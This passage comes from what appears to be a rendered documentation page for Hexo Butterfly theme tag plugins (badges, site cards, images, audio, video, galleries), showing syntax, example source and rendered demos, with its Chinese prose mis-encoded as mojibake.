class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.åŸºæœ¬å‚æ•°,å®šä¹‰å¾½æ ‡å·¦å³æ–‡å­—å’Œå›¾æ ‡</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.ä¿¡æ¯å‚æ•°ï¼Œå®šä¹‰å¾½æ ‡å³ä¾§å†…å®¹èƒŒæ™¯è‰²ï¼ŒæŒ‡å‘é“¾æ¥</p><p><object class="ghbdage" style="margin-inline:5px" title="æœ¬ç«™ä½¿ç”¨JsDelivrä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿ" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//å¦‚æœæ˜¯è·¨é¡ºåºçœç•¥å¯é€‰å‚æ•°ï¼Œä»ç„¶éœ€è¦å†™ä¸ªé€—å·,ç”¨ä½œåˆ†å‰²<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.æ‹“å±•å‚æ•°ï¼Œæ”¯æŒshieldsçš„APIçš„å…¨éƒ¨å‚æ•°å†…å®¹</p><p><object class="ghbdage" style="margin-inline:5px" title="æœ¬ç«™é‡‡ç”¨åŒçº¿éƒ¨ç½²ï¼Œé»˜è®¤çº¿è·¯æ‰˜ç®¡äºVercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//å¦‚æœæ˜¯è·¨é¡ºåºçœç•¥å¯é€‰å‚æ•°ç»„ï¼Œä»ç„¶éœ€è¦å†™åŒç«–çº¿||ç”¨ä½œåˆ†å‰²<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-ç½‘ç«™å¡ç‰‡-sites">2.14 ç½‘ç«™å¡ç‰‡ sites</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site æ ‡é¢˜, url=é“¾æ¥, screenshot=æˆªå›¾é“¾æ¥, avatar=å¤´åƒé“¾æ¥ï¼ˆå¯é€‰ï¼‰, description=æè¿°ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br><span class="line">&#123;% site æ ‡é¢˜, url=é“¾æ¥, screenshot=æˆªå›¾é“¾æ¥, avatar=å¤´åƒé“¾æ¥ï¼ˆå¯é€‰ï¼‰, description=æè¿°ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=ç®€çº¦é£æ ¼ %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­— %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­— %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­— %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­— %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">ç®€çº¦é£æ ¼</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­—</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­—</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­—</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">è¿™æ˜¯ä¸€æ®µå…³äºè¿™ä¸ªç½‘ç«™çš„æè¿°æ–‡å­—</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-è¡Œå†…å›¾ç‰‡-inlineimage">2.15 è¡Œå†…å›¾ç‰‡ inlineimage</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage å›¾ç‰‡é“¾æ¥, height=é«˜åº¦ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>é«˜åº¦</code>ï¼šheight=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯ &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; ä¸€æ®µè¯ã€‚</span><br><span class="line"></span><br><span class="line">è¿™åˆæ˜¯ &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; ä¸€æ®µè¯ã€‚</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>è¿™æ˜¯ <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> ä¸€æ®µè¯ã€‚</p><p>è¿™åˆæ˜¯ <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> ä¸€æ®µè¯ã€‚</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-å•å¼ å›¾ç‰‡-image">2.16 å•å¼ å›¾ç‰‡ image</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image é“¾æ¥, width=å®½åº¦ï¼ˆå¯é€‰ï¼‰, height=é«˜åº¦ï¼ˆå¯é€‰ï¼‰, alt=æè¿°ï¼ˆå¯é€‰ï¼‰, bg=å ä½é¢œè‰²ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li>å›¾ç‰‡å®½åº¦é«˜åº¦ï¼šwidth=300px, height=32px</li><li>å›¾ç‰‡æè¿°ï¼šalt=å›¾ç‰‡æè¿°ï¼ˆbutterflyéœ€è¦åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­å¼€å¯å›¾ç‰‡æè¿°ï¼‰</li><li>å ä½èƒŒæ™¯è‰²ï¼šbg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.æ·»åŠ æè¿°ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚ %&#125;</span><br></pre></td></tr></table></figure><p>2.æŒ‡å®šå®½åº¦</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.æŒ‡å®šå®½åº¦å¹¶æ·»åŠ æè¿°ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚ %&#125;</span><br></pre></td></tr></table></figure><p>4.è®¾ç½®å ä½èƒŒæ™¯è‰²ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=ä¼˜åŒ–ä¸åŒå®½åº¦æµè§ˆçš„è§‚æ„Ÿ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.æ·»åŠ æè¿°ï¼š</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚"/></div><span class="image-caption">æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚</span></div>2..æŒ‡å®šå®½åº¦<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.æŒ‡å®šå®½åº¦å¹¶æ·»åŠ æè¿°ï¼š<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚" style="width:400px;"/></div><span class="image-caption">æ¯å¤©ä¸‹è¯¾å›å®¿èˆçš„è·¯ï¼Œæ²¡æœ‰ä»€ä¹ˆæ•…äº‹ã€‚</span></div>4.è®¾ç½®å ä½èƒŒæ™¯è‰²ï¼š<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="ä¼˜åŒ–ä¸åŒå®½åº¦æµè§ˆçš„è§‚æ„Ÿ" style="width:400px;"/></div><span class="image-caption">ä¼˜åŒ–ä¸åŒå®½åº¦æµè§ˆçš„è§‚æ„Ÿ</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-éŸ³é¢‘-audio">2.17 éŸ³é¢‘ audio</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio éŸ³é¢‘é“¾æ¥ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-è§†é¢‘-video">2.18 è§†é¢‘ video</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video è§†é¢‘é“¾æ¥ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>å¯¹é½æ–¹å‘</code>ï¼šleft, center, right</li><li><code>åˆ—æ•°</code>ï¼šé€—å·åé¢ç›´æ¥å†™åˆ—æ•°ï¼Œæ”¯æŒ 1 ï½ 4 åˆ—ã€‚</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.100%å®½åº¦</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%å®½åº¦</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%å®½åº¦</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.100%å®½åº¦</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%å®½åº¦<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%å®½åº¦<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-ç›¸å†Œ-gallery">2.19 ç›¸å†Œ gallery</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><p>1.gallerygroup ç›¸å†Œå›¾åº“</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery ç›¸å†Œ</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown åœ–ç‰‡æ ¼å¼</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ul><li>gallerygroup ç›¸å†Œå›¾åº“</li></ul><table><thead><tr><th>å‚æ•°å</th><th>é‡Šä¹‰</th></tr></thead><tbody><tr><td>name</td><td>å›¾åº“åå­—</td></tr><tr><td>description</td><td>å›¾åº“æè¿°</td></tr><tr><td>link</td><td>é“¾æ¥åˆ°å¯¹åº”ç›¸å†Œçš„åœ°å€</td></tr><tr><td>img-url</td><td>å›¾åº“å°é¢</td></tr></tbody></table><ul><li><p>gallery ç›¸å†Œ</p><p>åŒºåˆ«äºæ—§ç‰ˆçš„Galleryç›¸å†Œ,æ–°çš„Galleryç›¸å†Œä¼šè‡ªåŠ¨æ ¹æ®å›¾ç‰‡é•¿åº¦è¿›è¡Œæ’ç‰ˆï¼Œä¹¦å†™ä¹Ÿæ›´åŠ æ–¹ä¾¿ï¼Œä¸markdownæ ¼å¼ä¸€æ ·ã€‚å¯æ ¹æ®éœ€è¦æ’å…¥åˆ°ç›¸åº”çš„mdã€‚æ— éœ€å†è‡ªå·±é…ç½®é•¿å®½ã€‚<strong>å»ºè®®åœ¨ç²˜è´´æ—¶æ•…æ„ä½¿ç”¨é•¿çŸ­ã€å¤§å°ã€æ¨ªç«–ä¸ä¸€çš„å›¾ç‰‡</strong>ï¼Œä¼šæœ‰æ›´å¥½çš„æ•ˆæœã€‚ï¼ˆå°ºå¯¸å®Œå…¨ç›¸åŒçš„å›¾ç‰‡åªä¼šå¹³é“ºè¾“å‡ºï¼Œæ•ˆæœå¾ˆç³Ÿç³•ï¼‰</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.gallerygroup ç›¸å†Œå›¾åº“</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC åœ¨Rikkaã®å…­èŠ±æœåŠ¡å™¨é‡Œç•™ä¸‹çš„è¶³è¿¹ &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam å“¦å’§å“‡gundamå“’ï¼ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar æŸç§æ„ä¹‰ä¸Šä¹Ÿç®—è‡ªæ‹å§ &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery ç›¸å†Œ</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span 